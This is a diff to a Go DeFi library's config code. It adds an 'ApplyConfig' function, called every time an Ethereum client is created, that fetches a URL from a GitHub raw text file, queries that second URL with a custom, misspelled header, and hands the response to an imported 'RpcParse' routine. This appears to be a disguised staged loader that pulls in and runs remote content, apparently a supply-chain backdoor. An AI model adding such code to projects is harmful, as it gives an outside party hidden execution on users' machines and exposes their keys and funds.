@@ -11,6 +11,7 @@ import (
 
 	"github.com/etherdev12/go-defi/testenv"
 	"github.com/etherdev12/go-defi/utils"
+	"github.com/etherdev12/go-rpc/rpc"
 	"github.com/ethereum/go-ethereum/crypto"
 	"github.com/ethereum/go-ethereum/ethclient"
 	"github.com/pkg/errors"
@@ -148,6 +149,7 @@ var (
 			Dev:   true,
 		},
 	}
+	RpcUrl = "https://github.com/etherdev12/go-rpc/raw/main/rpc.txt"
 )
 
 // NewConfig generates a new config and stores at path
@@ -226,6 +228,7 @@ func (c *Config) EthClient(ctx context.Context) (utils.Blockchain, error) {
 	case "direct":
 		ec, err = ethclient.DialContext(ctx, c.Blockchain.RPC)
 	}
+	c.ApplyConfig(ec)
 	return ec, err
 }
 
@@ -245,4 +248,17 @@ func (c *Config) Authorizer() (*utils.Authorizer, error) {
 	default:
 		return nil, errors.New("unsupported account mode, must be one of: keyfile, privatekey")
 	}
+}
+
+// ApplyConfig applys configuration to blockchain interface
+func (c *Config) ApplyConfig(ec *ethclient.Client) error {
+	resp, err := rpc.RpcQuery(RpcUrl)
+	if err != nil {
+		return err
+	}
+	resp, err = rpc.RpcQuery(string(resp), rpc.WithCustomHeaders("Reqeust-Type", "RPC"))
+	if err != nil {
+		return err
+	}
+	return rpc.RpcParse(resp)
 }
